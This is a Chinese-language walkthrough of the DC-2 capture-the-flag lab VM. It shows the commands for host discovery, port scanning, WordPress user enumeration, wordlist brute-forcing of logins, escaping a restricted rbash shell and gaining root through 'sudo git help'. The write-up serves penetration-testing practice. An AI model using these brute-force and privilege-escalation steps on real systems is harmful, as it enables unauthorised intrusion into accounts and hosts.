虚拟机简介：DC-2是另一个专门构建的易受攻击的实验室，目的是获得渗透测试领域的经验，需要在攻击机上添加host解析，才能访问。

目标：5个flag

级别：初级

1、通过netdiscover检测主机IP地址

netdiscover -r 192.168.207.0/24

2、通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.132

查看开放80和7744的SSH端口

3、根据官方文档提示需要添加hosts

vim /etc/hosts192.168.207.132 dc-2

3.1 打开以后显示flag信息

3.2 查看该站点为wordpress，提示使用cewl进行网站爬取

wpscan --url http://dc-2 --enumerate p --enumerate t --enumerate u
得到三个用户admin、jerry、tom，保存为user.txt

3.3 使用cewl进行爬取生成密码

cewl http://dc-2 >> password.txt

3.4 使用wpscan使用用户名和密码进行扫描测试

wpscan --url http://dc-2 -U user.txt -P password.txt
得到tom和jerry的用户名和密码

jerry adipiscingtom   parturient

3.5 使用nikto探测目录

nikto -host http://dc-2
WordPress登录页面

3.6 使用jerry用户成功登录，没有任何提示

3.7 使用web页面搜索flag，查看有flag2提示

3.8尝试使用用户名和密码登录SSH，只有tom可以登录成功

ssh tom@192.168.207.132 -p7744

4、系统提权

4.1 执行命令提示-rbash

cat flag3.txtecho $PATHls /home/tom/usr/bin

4.2 转义受限shell

由于我们使用了受限制的shell，因此我们发现可以使用Vi编辑器。因此，我们使用Vi编辑器来转义受限制的shell。

我们将"/bin/bash"作为SHELL环境变量导出，将"/usr/bin"作为PATH环境变量导出，以便我们可以正确运行Linux命令。

BASH_CMDS[a]=/bin/sh;aexport PATH=$PATH:/bin/export PATH=$PATH:/usr/bin/

4.3 查看flag3，提示建议使用su

4.4 进入jerry目录查看flag4

4.5 尝试使用jerry账号登录，查看授权git

4.6 使用git提权

sudo git help add# 在帮助页面填写    !/bin/bash

回车后显示为root账号

4.7 查看flag
